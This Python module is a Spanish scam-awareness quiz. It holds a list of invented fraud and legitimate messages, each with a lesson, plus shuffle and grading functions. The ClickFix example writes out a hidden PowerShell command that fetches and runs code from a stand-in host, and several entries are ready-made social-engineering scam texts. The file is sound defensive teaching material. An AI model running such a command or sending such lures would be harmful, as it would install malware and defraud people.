"""Escuela del Guardián: ¿lo detectas? Un juego para aprender a ver las estafas antes de picar.

    python -m guardian aprende

Te enseña mensajes de verdad (inventados, pero copiados de los engaños que más circulan en España) y tú decides
si es una estafa o es de fiar. Después te explica las pistas una a una, con el mismo análisis que usa
«¿Es una estafa?». Hay mensajes legítimos a propósito: aprender a no desconfiar de todo también cuenta.
Los datos, los enlaces y los teléfonos son inventados (dominios .example, .top...): no lleves a nadie a una web real.
"""

import random
from dataclasses import dataclass

from .estafas import InformeEstafa, analizar


@dataclass(frozen=True)
class Mensaje:
    canal: str  # SMS, WhatsApp, correo...
    remitente: str
    texto: str
    es_estafa: bool
    leccion: str  # lo que hay que quedarse


MENSAJES = [
    Mensaje("SMS", "Correos", "Correos: Su paquete ES2611478 está retenido en nuestro centro por tasas de aduana "
            "impagadas. Abone 1,99 € en las próximas 24 horas en https://correos-envios.top/pago o será devuelto al "
            "remitente.", True,
            "Correos no cobra tasas por SMS con enlaces. El dominio no es correos.es, te mete prisa y te pide poco "
            "dinero para quedarse con tu tarjeta."),
    Mensaje("WhatsApp", "+34 631 22 45 98 (número desconocido)", "Hola mamá, se me ha caído el móvil al váter y este "
            "es mi nuevo número, guárdalo. Oye, ¿puedes hacerme un Bizum de 480 €? Es para pagar una factura urgente, "
            "mañana te lo devuelvo. No me llames que no puedo hablar.", True,
            "Un número nuevo + dinero urgente + «no me llames» = estafa del hijo en apuros. Llama al número de siempre."),
    Mensaje("SMS", "BBVA", "BBVA: Compra de 45,00 EUR en MERCADONA con tu tarjeta terminada en 1234. Si no la "
            "reconoces, entra en la app BBVA o llama al número que aparece en el reverso de tu tarjeta.", False,
            "Es un aviso normal: no trae enlaces, no te pide datos y te manda a la app o al teléfono de tu tarjeta."),
    Mensaje("Correo", "Agencia Tributaria <notificaciones@aeat-devoluciones.com>", "AGENCIA TRIBUTARIA: Tras revisar "
            "su declaración, tiene derecho a una devolución de 324,50 €. Para recibirla, confirme sus datos bancarios "
            "antes del viernes en https://bit.ly/aeat-devolucion", True,
            "Hacienda no avisa de devoluciones con enlaces acortados ni desde dominios .com raros. Entra tú en "
            "agenciatributaria.gob.es."),
    Mensaje("SMS", "Google", "G-482913 es tu código de verificación de Google. No lo compartas con nadie.", False,
            "Es normal recibir códigos cuando TÚ inicias sesión. Lo peligroso es dárselo a alguien: nadie de verdad "
            "te lo pedirá."),
    Mensaje("WhatsApp", "Laura (amiga del gimnasio)", "Hola!! Perdona, te he enviado un código de 6 dígitos por error "
            "a tu número, ¿me lo pasas porfa? Es que lo necesito urgente para entrar en mi cuenta.", True,
            "Ese código es el de TU WhatsApp. Si lo das, te roban la cuenta (y luego piden dinero a tus contactos). "
            "Aunque parezca una amiga: a ella también se la robaron así."),
    Mensaje("Correo", "Javier Ruiz, director financiero <javier.ruiz@empresa-grupo.es>", "Hola Marta, te escribo desde "
            "el móvil porque estoy en una reunión con el consejo. Hemos cambiado de banco y a partir de ahora los pagos "
            "al proveedor Logística Norte van al nuevo IBAN ES76 0081 7011 1100 0123 4567. Necesito que hagas hoy "
            "mismo la transferencia pendiente de 18.400 €. Es confidencial, no lo comentes con nadie hasta que lo "
            "anunciemos.", True,
            "Cambio de cuenta + prisa + secreto = fraude del CEO. Se confirma SIEMPRE por teléfono, al número de "
            "siempre, aunque el correo parezca de tu jefe."),
    Mensaje("Web", "Una web de descargas", "Verificación de seguridad: para demostrar que no eres un robot, 1) pulsa "
            "Windows + R, 2) pulsa Ctrl + V y 3) pulsa Enter. (Al abrir la página se copió sola esta orden: "
            "powershell -w hidden -c \"irm https://check-captcha.example/v | iex\")", True,
            "Es ClickFix: ningún «no soy un robot» de verdad te pide pegar nada en Windows. Lo que pegas descarga un "
            "programa que roba contraseñas."),
    Mensaje("Correo", "Tu compañero Pablo", "Hola, te paso el acta de la reunión de ayer y el calendario de entregas. "
            "Si ves algo raro me dices y lo cambio antes del jueves. ¡Gracias!", False,
            "Un correo normal de trabajo: sin prisas raras, sin enlaces extraños y sin pedirte datos ni dinero."),
    Mensaje("Correo", "Anónimo", "He tenido acceso a tu dispositivo durante meses y he grabado un vídeo tuyo con tu "
            "webcam mientras visitabas páginas para adultos. Envía 1200 € en Bitcoin a este monedero en 48 horas o "
            "lo enviaré a todos tus contactos.", True,
            "Sextorsión: es un correo masivo. No tienen ningún vídeo. No pagues ni contestes."),
    Mensaje("SMS", "Wallapop (comprador)", "Hola, me quedo el sofá. Te he enviado una solicitud de Bizum de 150 €, "
            "acéptala para recibir el dinero y paso a recogerlo esta tarde.", True,
            "Bizum inverso: aceptar una solicitud es PAGAR. Para recibir un Bizum no tienes que aceptar nada."),
    Mensaje("Aviso en el navegador", "«Microsoft»", "ALERTA DE MICROSOFT: su ordenador ha sido bloqueado por un virus "
            "detectado. Llame inmediatamente al soporte técnico de Microsoft al 900 000 000 y siga las instrucciones "
            "para instalar AnyDesk.", True,
            "Falso soporte técnico: Microsoft no bloquea tu PC con un aviso ni te pide instalar AnyDesk. Cierra el "
            "navegador (si no puedes, reinicia)."),
    Mensaje("SMS", "Correos", "Correos: tu envío PK2026ES llegará mañana entre las 9:00 y las 14:00. Puedes ver el "
            "seguimiento en la app de Correos o en correos.es con ese código.", False,
            "Aviso legítimo: no pide pagos ni datos y te manda a la web oficial escribiéndola tú."),
]


def mezclados(cuantos: int | None = None, semilla: int | None = None) -> list[Mensaje]:
    """Los mensajes en un orden al azar (con semilla, siempre el mismo orden: para los tests)."""
    lista = list(MENSAJES)
    random.Random(semilla).shuffle(lista)
    return lista[:cuantos] if cuantos else lista


def corregir(mensaje: Mensaje, dice_que_es_estafa: bool) -> tuple[bool, InformeEstafa]:
    """¿Ha acertado? Y el análisis del Guardián para explicar por qué."""
    return dice_que_es_estafa == mensaje.es_estafa, analizar(mensaje.texto)
